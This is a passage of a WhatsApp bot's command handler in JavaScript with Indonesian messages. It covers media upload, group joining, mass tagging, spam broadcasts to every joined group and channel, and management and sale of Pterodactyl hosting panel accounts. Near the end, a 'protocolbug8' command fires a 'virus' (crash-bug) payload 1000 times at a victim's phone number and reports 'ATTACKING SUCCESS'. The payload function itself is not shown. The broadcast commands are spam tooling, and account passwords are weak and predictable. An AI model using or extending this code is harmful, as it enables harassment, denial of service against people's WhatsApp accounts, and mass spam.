    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return ReplyButton('Failed to upload media!');
    }

    ReplyButton(`${link}`)
}
break
case "joingc": case "join": {
if (!isCreator) return ReplyButton(mess.owner);
if (!q) return ReplyButton(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await client.groupAcceptInvite(result);
ReplyButton(`Berhasil bergabung ke grup ✅`)
}
//=================================================//
// Command Group
//=================================================//

break;
case 'hidetag': {
  if (!isCreator) return;
  if (!m.isGroup) return;

  const groupMetadata = await client.groupMetadata(from);
  const participants = groupMetadata.participants.map(p => p.id);

  const messageText = q ? q : 'Zoro Always Stay In Here';

  await client.sendMessage(from, {
    text: messageText,
    mentions: participants
  }, { quoted: null });
}
//=================================================//
// Command Jpm
//=================================================//

break

case "jpm": {
    if (!isCreator) return ReplyButton(mess.owner);
    if (!q) return ReplyButton(example("teksnya bisa dengan kirim foto juga"));

    // Inisialisasi aman
    if (!global.db) global.db = {};
    if (!global.db.groups) global.db.groups = {};

    let rest;
    if (/image/.test(mime)) {
        rest = await client.downloadAndSaveMediaMessage(qmsg);
    }

    const allgrup = await client.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    const ttks = text;
    const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks };
    const opsijpm = rest !== undefined ? "teks & foto" : "teks";
    const jid = m.chat;

    await ReplyButton(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`);

    for (let i of res) {
        if (global.db.groups?.[i]?.blacklistjpm === true) continue;
        try {
            await client.sendMessage(i, pesancoy, { quoted: null });
            count++;
        } catch {}
        await sleep(3500);
    }

    if (rest !== undefined) await fs.unlinkSync(rest);
    await client.sendMessage(jid, { text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat` }, { quoted: m });
}
break;

case "jpmht": {
    if (!isCreator) return ReplyButton(mess.owner);
    if (!q) return ReplyButton(example("teksnya bisa dengan kirim foto juga"));

    // Inisialisasi aman
    if (!global.db) global.db = {};
    if (!global.db.groups) global.db.groups = {};

    let rest;
    if (/image/.test(mime)) {
        rest = await client.downloadAndSaveMediaMessage(qmsg);
    }

    const allgrup = await client.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    const ttks = text;
    const opsijpm = rest !== undefined ? "teks & foto ht" : "teks ht";
    const jid = m.chat;

    await ReplyButton(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`);

    for (let i of res) {
        if (global.db.groups?.[i]?.blacklistjpm === true) continue;

        try {
            const ments = allgrup[i].participants.map(e => e.id);
            const pesancoy = rest !== undefined
                ? { image: await fs.readFileSync(rest), caption: ttks, mentions: ments }
                : { text: ttks, mentions: ments };

            await client.sendMessage(i, pesancoy, { quoted: null });
            count++;
        } catch (e) {
            console.error(`Gagal kirim ke ${i}:`, e.message);
        }

        await sleep(3500);
    }

    if (rest !== undefined) await fs.unlinkSync(rest);

    await client.sendMessage(jid, {
        text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat`
    }, { quoted: m });
}
break;

case "addidch": {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!text) return ReplyButton("Harap masukkan link saluran!");

    let channelLink = text.trim();

    if (!channelLink.includes("https://whatsapp.com/channel/")) {
        return ReplyButton("Link saluran tidak valid! Harus berupa link WhatsApp (https://whatsapp.com/channel/...)");
    }

    let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
    if (!channelId) return ReplyButton("Gagal mengekstrak ID dari link saluran!");

    try {
        let res = await client.newsletterMetadata("invite", channelId);

        if (!res.id) return ReplyButton("ID saluran tidak valid!");

        global.channels = loadChannels();

        if (global.channels.includes(res.id)) {
            return ReplyButton(`ID Saluran *${res.id}* sudah terdaftar!`);
        }

        global.channels.push(res.id);
        saveChannels(global.channels);

        ReplyButton(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
    } catch (e) {
        console.error(e);
        ReplyButton("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
    }
}
break;

case "delidch": {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!text) return ReplyButton("Harap masukkan nomor atau ID saluran yang ingin dihapus!");

    global.channels = loadChannels();

    if (!isNaN(text)) {
        let index = parseInt(text.trim()) - 1;

        if (index < 0 || index >= global.channels.length) {
            return ReplyButton("Nomor urut tidak valid!");
        }

        let removed = global.channels.splice(index, 1);
        saveChannels(global.channels);

        ReplyButton(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
    } else {
        let channelId = text.trim();

        if (!global.channels.includes(channelId)) {
            return ReplyButton("ID Saluran tidak ditemukan!");
        }

        global.channels = global.channels.filter((id) => id !== channelId);
        saveChannels(global.channels);

        ReplyButton(`Berhasil menghapus ID Saluran: *${channelId}*`);
    }
}
break;

case "listidch": {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);

    global.channels = loadChannels();

    if (global.channels.length === 0) {
        return ReplyButton("Belum ada ID saluran yang terdaftar!");
    }

    let list = global.channels
        .map((id, index) => `${index + 1}. ${id}`)
        .join("\n");

    ReplyButton(`Daftar ID Saluran Terdaftar:\n\n${list}`);
}
break
case "jpmchvip": {
    if (!isCreator && !isPremium && !isOwnJasher) return ReplyButton(mess.premium);
    if (!text && !m.quoted) return ReplyButton(example("Teksnya atau reply teks"));
    var teks = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();

    if (global.channels.length === 0) 
        return ReplyButton(`
╔══════════════════════════╗
        ❌ *SALAHAN* ❌
╚══════════════════════════╝
⚠️ Tidak ada saluran terdaftar untuk *JPM*!
Silakan daftarkan saluran terlebih dahulu.
`);

    ReplyButton(`
╭─❰ *PROCESSING MESSAGE* ❱─╮
📬 *Mengirim Pesan Ke*: 
  ➥ *${global.channels.length} Saluran*
⏳ *Mohon Tunggu...*
╰─────────────────────╯
    `);

    // Kirim pesan ke semua saluran tanpa penundaan
    await Promise.all(global.channels.map(async (id) => {
        try {
            await client.sendMessage(id, { text: teks }, { quoted: null });
            total += 1;
        } catch (e) {
            console.log(`⚠️ Gagal mengirim ke ${id}:`, e);
        }
    }));

    ReplyButton(`
╭─❰ *RESULT SUMMARY* ❱─╮
🎉 *Pesan Terkirim*: 
  ➥ *${total} Saluran*
✅ *Status*: Berhasil!
📩 Terima kasih telah menggunakan layanan ini.
╰─────────────────────╯
`);
}
break
case 'jpmch': {
    const cooldownTime = (Number(global.cd) || 300) * 1000;
    const now = Date.now();

    if (!global.lastJpmchTime) global.lastJpmchTime = 0;

    const timePassed = now - global.lastJpmchTime;
    const remaining = cooldownTime - timePassed;

    if (remaining > 0) {
        const detik = Math.ceil(remaining / 1000);
        return ReplyButton(`⏳ Fitur ini sedang cooldown.\nTunggu *${detik} detik* lagi.`);
    }

    if (!isCreator && !isPremium && !isOwnJasher) return ReplyButton(mess.premium);
    if (!text && !m.quoted) return ReplyButton(example("Teksnya atau reply teks"));
    const teks = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();
    if (global.channels.length === 0)
        return ReplyButton("⚠️ Tidak ada saluran terdaftar.");

    ReplyButton("⏳ Mengirim pesan, harap tunggu...");

    for (const id of global.channels) {
        try {
            await client.sendMessage(id, { text: teks }, { quoted: null });
            total++;
            await sleep(1000);
        } catch (e) {
            console.log(`❌ Gagal kirim ke ${id}:`, e.message);
        }
    }

    global.lastJpmchTime = now;

    ReplyButton(`✅ Pesan berhasil dikirim ke *${total} saluran*`);
}
//=================================================//
// Command Panel — Kedua
//=================================================//
break
case "delpanel2": case "hapuspanel2": {
await client.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
if (!isCreator) return ReplyButton(mess.owner);
if (global.apikey2.length < 1) return ReplyButton("Apikey Tidak Ditemukan!")
if (!args[0]) return ReplyButton(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return ReplyButton("*ID Server/User* Tidak Ditemukan")
ReplyButton(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}

break
        case "deladmin2": {
  if (!isCreator) return ReplyButton(mess.owner);
let usr = args[0]
if (!usr) return ReplyButton('ID nya mana?')
let f = await fetch(domain2 + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return ReplyButton('*USER NOT FOUND*')
ReplyButton('*SUCCESSFULLY DELETE ADMIN*')
}
break
/*==============================================*/
case "listadmin2": {
  if (!isCreator) return ReplyButton(mess.owner);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain2 + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await client.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    ReplyButton(`Gunakan perintah ${prefix}listadmin ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
/*==============================================*/
case "listpanel2": case "listp2": case "listserver2": {
await client.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
if (global.apikey2.length < 1) return ReplyButton("Apikey Tidak Ditemukan!")
if (!isCreator) return ReplyButton(mess.owner);
let f = await fetch(domain2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ReplyButton("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Status : *${status}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await client.sendMessage(m.chat, { text: messageText }, { quoted: qtext })
}
break
/*==============================================*/
case "cadmin2": {
let desc = tanggal(Date.now())
if (!isCreator) return ReplyButton(mess.owner);
if (!text) return ReplyButton(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyButton(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyButton("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain2}

*Rules Admin Panel ⚠️*
* dilarang intip panel orang
* dilarang otak atik panel
* dilarang ganti nama panel
* dilarang ambil sc orang
* dilarang create admin panel
* dilarang otak atik nodejs
* dilarang otak atik apa pun
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
KALO GA PAHAM LIAT YT JANGAN NEKAT 
BIKIN ASAL ASALAN KARENA KALO SALAH
BAKALAN DI DELET TRX NO REFF NO KOMEN


*NOTE* :
*OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
`
await client.sendMessage(orang, {text: teks}, {quoted: m})
}
break
/*==============================================*/
case "1gb2": case "2gb2": case "3gb2": case "4gb2": case "5gb2": case "6gb2": case "7gb2": case "8gb2": case "9gb2": case "10gb2": case "unlimited": case "unli": {
if (!isPremium && !isCreator) return ReplyButton(mess.premium);
if (!text) return ReplyButton(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyButton(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain2 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return ReplyButton(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyButton("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain2}

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await client.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}

//=================================================//
// Command Panel — Utama
//=================================================//
break
case "delpanel": case "hapuspanel": {
await client.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
if (!isCreator) return ReplyButton(mess.owner);
if (global.apikey.length < 1) return ReplyButton("Apikey Tidak Ditemukan!")
if (!args[0]) return ReplyButton(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return ReplyButton("*ID Server/User* Tidak Ditemukan")
ReplyButton(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break
/*==============================================*/
        case "deladmin": {
  if (!isCreator) return ReplyButton(mess.owner);
let usr = args[0]
if (!usr) return ReplyButton('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return ReplyButton('*USER NOT FOUND*')
ReplyButton('*SUCCESSFULLY DELETE ADMIN*')
}
break
/*==============================================*/
case "listadmin": {
  if (!isCreator) return ReplyButton(mess.owner);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await client.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    ReplyButton(`Gunakan perintah ${prefix}listadmin ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
/*==============================================*/
case "listpanel": case "listp": case "listserver": {
await client.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
if (global.apikey.length < 1) return ReplyButton("Apikey Tidak Ditemukan!")
if (!isCreator) return ReplyButton(mess.owner);
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ReplyButton("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Status : *${status}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await client.sendMessage(m.chat, { text: messageText }, { quoted: qtext })
}
break
/*==============================================*/
case "cadmin": {
let desc = tanggal(Date.now())
if (!isCreator) return ReplyButton(mess.owner);
if (!text) return ReplyButton(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyButton(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyButton("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* dilarang intip panel orang
* dilarang otak atik panel
* dilarang ganti nama panel
* dilarang ambil sc orang
* dilarang create admin panel
* dilarang otak atik nodejs
* dilarang otak atik apa pun
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
KALO GA PAHAM LIAT YT JANGAN NEKAT 
BIKIN ASAL ASALAN KARENA KALO SALAH
BAKALAN DI DELET TRX NO REFF NO KOMEN


*NOTE* :
*OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
`
await client.sendMessage(orang, {text: teks}, {quoted: m})
}
break
/*==============================================*/
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isPremium && !isCreator) return ReplyButton(mess.premium);
if (!text) return ReplyButton(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyButton(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return ReplyButton(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyButton("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await client.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
//=================================================//
// Command Bug
//=================================================//

break
case 'protocolbug8': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© Protocolbug8 : ${i}/1000
target : ${target}`));
await protocolbug1(client, target, false)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case "dev":
case "devoloper":
case "owner":
case "xowner": {
  let namaown = `𝐑𝐢𝐳𝐱𝐕𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ`
  let NoOwn = `6289501955295`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
